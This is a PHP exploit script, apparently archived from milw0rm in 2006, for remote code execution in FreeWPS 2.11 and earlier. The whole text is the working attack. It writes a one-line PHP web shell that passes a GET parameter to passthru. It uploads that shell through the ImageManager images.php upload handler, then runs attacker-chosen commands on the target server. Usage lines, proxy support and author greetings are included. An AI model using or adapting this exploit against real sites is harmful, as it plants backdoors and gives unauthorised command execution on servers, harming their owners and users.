<html><head><title>FreeWPS <= 2.11 (images.php) Remote Code Execution Exploit</title></head><pre>&lt;?
error_reporting(E_ERROR);

function exploit_init()
{
    if (!extension_loaded('php_curl') &amp;&amp; !extension_loaded('curl'))
    {
       if (!dl('curl.so') &amp;&amp; !dl('php_curl.dll'))
       die (&quot;oo error - cannot load curl extension!&quot;);
    }
}

function exploit_header()
{
    echo &quot;\noooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo&quot;;
    echo &quot;                                  oo    ooooooo     ooooooo\n&quot;;
    echo &quot;                    oooo   oooo o888  o88     888 o888   888o\n&quot;;
    echo &quot;                      888o888    888        o888   888888888\n&quot;;
    echo &quot;                      o88888o    888     o888   o 888o   o888\n&quot;;
    echo &quot;                    o88o   o88o o888o o8888oooo88   88ooo88\n&quot;;
    echo &quot;ooooooooooooooooooooooooooooo freewps 2.11 exploit ooooooooooooooooooooooooooooo\n&quot;;
    echo &quot;oo usage          $ php freewps-211-exploit.php [url] [cmd]\n&quot;;
    echo &quot;oo proxy support  $ php freewps-211-exploit.php [url] [cmd] [proxy]:[port]\n&quot;;
    echo &quot;oo example        $ php freewps-211-exploit.php http://localhost 'ls -a'\n&quot;;
    echo &quot;oo execute a command on the remote system by uploading a shell\n\n&quot;;
    echo &quot;oo command : &quot; . $_SERVER['argv'][2] . &quot;\n\n&quot;;
}

function exploit_bottom()
{
    echo &quot;\noo greets   : b0xC - i want to wish you a happy 21st birthday! this is my small\n&quot;;
    echo &quot;              present for you. :)\n&quot;;
    echo &quot;oo discover : x128 - alexander wilhelm - 21/03/2006\n&quot;;
    echo &quot;oo contact  : exploit &lt;at&gt; x128.net                    oo website : www.x128.net\n&quot;;
}

function exploit_execute()
{
    $connection = curl_init();

    if ($_SERVER['argv'][3])
    {
        curl_setopt($connection, CURLOPT_TIMEOUT, 8);
        curl_setopt($connection, CURLOPT_PROXY, $_SERVER['argv'][3]);
    }
    curl_setopt ($connection, CURLOPT_USERAGENT, 'x128');
    curl_setopt ($connection, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt ($connection, CURLOPT_HEADER, 0);

    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/upload/shell.php&quot;);
    $source = curl_exec($connection);

    if(strpos($source, &quot;404&quot;))
    {
       $shell = fopen(&quot;shell.php&quot;, &quot;w&quot;);
       fwrite($shell, &quot;&lt;? ini_set(max_execution_time,0); passthru(\$HTTP_GET_VARS[shell]); ?&gt;&quot;);
       fclose($shell);

       curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/htmlarea/popups/ImageManager/images.php&quot;);
       curl_setopt ($connection, CURLOPT_POST, 1);
       curl_setopt ($connection, CURLOPT_POSTFIELDS, array(&quot;upload&quot; =&gt; &quot;@shell.php&quot;, &quot;dirPath&quot;=&gt; &quot;/upload&quot;));
       curl_exec($connection) or die(&quot;oo error - cannot connect!\n&quot;);

       sleep(2);
       unlink(&quot;shell.php&quot;);
    }
    curl_setopt ($connection, CURLOPT_POST, 0);
    curl_setopt ($connection, CURLOPT_URL, $_SERVER['argv'][1] . &quot;/upload/shell.php?shell=&quot; . urlencode($_SERVER['argv'][2]));

    $source = curl_exec($connection) or die(&quot;oo error - cannot connect!\n&quot;);

    echo $source;

    curl_close ($connection);
}

exploit_init();
exploit_header();
exploit_execute();
exploit_bottom();
?&gt;

# milw0rm.com [2006-03-21]</pre></html>